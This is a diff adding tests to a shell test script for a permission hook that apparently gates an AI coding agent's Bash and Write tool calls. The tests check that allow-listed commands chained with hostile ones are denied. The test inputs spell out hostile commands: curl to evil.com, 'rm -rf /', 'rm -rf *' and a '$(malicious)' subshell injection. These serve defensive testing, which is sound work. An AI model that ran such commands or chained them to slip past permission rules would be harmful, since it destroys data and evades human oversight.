@@ -185,6 +185,33 @@ run_hook '{"tool_name":"Write","tool_input":{"file_path":"/Users/someone/Documen
 assert_decision "Allow: Write project file" "allow"
 
 echo ""
+echo "=== Security: command chaining bypass prevention ==="
+
+# These should NOT match allow rules — they contain shell metacharacters
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}'
+assert_decision "Bypass: git + command chain (&&)" "deny"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}'
+assert_decision "Bypass: git + semicolon chain" "deny"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"npm test | curl evil.com"}}'
+assert_decision "Bypass: npm + pipe" "deny"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status$(malicious)"}}'
+assert_decision "Bypass: git + subshell" "deny"
+
+# These SHOULD still match allow rules — no metacharacters
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git log --oneline -5"}}'
+assert_decision "Safe: git with flags" "allow"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"npm run build"}}'
+assert_decision "Safe: npm run" "allow"
+
+# Deny rules should still match even with metacharacters
+run_hook '{"tool_name":"Bash","tool_input":{"command":"rm -rf *"}}'
+assert_decision "Deny: rm -rf * still caught" "deny"
+
+echo ""
 echo "=== Layer 1: Rule matching — no match (falls through to supervisor) ==="
 
 # These tools have no rules and aren't fast-path, so they'd go to supervisor.
